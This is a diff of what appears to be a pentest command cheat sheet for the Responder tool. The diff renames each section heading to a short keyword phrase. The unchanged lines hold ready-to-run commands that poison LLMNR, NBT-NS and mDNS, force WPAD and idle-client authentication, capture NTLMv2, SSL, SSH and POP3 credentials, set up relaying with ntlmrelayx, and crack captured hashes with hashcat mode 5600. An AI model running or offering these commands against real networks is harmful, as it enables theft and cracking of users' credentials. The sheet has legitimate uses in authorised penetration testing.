@@ -6,7 +6,7 @@
 
 ---
 
-## Basic Poisoning Mode
+## capture ntlm llmnr poison
 Poison LLMNR, NBT-NS, and mDNS requests and capture NTLMv2 hashes.
 
 ```bash
@@ -17,7 +17,7 @@ sudo responder -I {{IFACE:iface:eth0}} -dwv
 
 ---
 
-## Analyze Mode (Passive)
+## sniff passive analyze mode
 Listen passively without poisoning to identify broadcast traffic and potential targets.
 
 ```bash
@@ -28,7 +28,7 @@ sudo responder -I {{IFACE:iface:eth0}} -A
 
 ---
 
-## With Forced WPAD Authentication
+## capture wpad proxy auth
 Force WPAD proxy authentication to capture additional credentials.
 
 ```bash
@@ -39,7 +39,7 @@ sudo responder -I {{IFACE:iface:eth0}} -dwv -F
 
 ---
 
-## With Specific Protocols Enabled
+## poison selective protocols
 Enable only specific poisoning protocols for targeted attacks.
 
 ```bash
@@ -50,7 +50,7 @@ sudo responder -I {{IFACE:iface:eth0}} -r -d -w -v
 
 ---
 
-## Capture and Save Hashes
+## capture hashes save logs
 Capture hashes with output logged to a specific directory (default: /usr/share/responder/logs/).
 
 ```bash
@@ -61,7 +61,7 @@ sudo responder -I {{IFACE:iface:eth0}} -dwv && ls /usr/share/responder/logs/
 
 ---
 
-## Poison All Interfaces
+## poison all interfaces
 Poison across every interface (use with caution on multi-homed hosts).
 
 ```bash
@@ -72,7 +72,7 @@ sudo responder -I ALL
 
 ---
 
-## Force Authentication for Idle Clients
+## force auth idle clients
 Force clients to authenticate even when idle.
 
 ```bash
@@ -83,7 +83,7 @@ sudo responder -I {{IFACE:iface:eth0}} --force-auth
 
 ---
 
-## Capture SSL/SSH/POP3 Credentials
+## capture ssl ssh pop3 creds
 Enable SSL, SSH, and POP3 credential capture.
 
 ```bash
@@ -94,7 +94,7 @@ sudo responder -I {{IFACE:iface:eth0}} --ssl --pop --ssh
 
 ---
 
-## Run with Custom Config
+## run custom config
 Launch Responder with custom configuration file.
 
 ```bash
@@ -105,7 +105,7 @@ sudo responder -I {{IFACE:iface:eth0}} -c {{CONFIG:file:/path/to/Responder.conf}
 
 ---
 
-## Disable Specific Modules
+## disable smb wpad modules
 Run Responder with SMB and HTTP disabled (e.g. when relaying separately).
 
 ```bash
@@ -116,7 +116,7 @@ sudo responder -I {{IFACE:iface:eth0}} --disable-smb --disable-wpad
 
 ---
 
-## Crack Captured NTLM Hash
+## crack ntlmv2 hashcat
 Crack captured NTLMv2 hash with Hashcat (mode 5600).
 
 ```bash
@@ -127,7 +127,7 @@ hashcat -m 5600 {{HASHFILE:file:Responder-Session.log}} {{WORDLIST:wordlist:/usr
 
 ---
 
-## Pair with NTLM Relay (no http/smb)
+## disable http smb ntlmrelayx
 Disable HTTP/SMB so ntlmrelayx can take over those sockets.
 
 ```bash
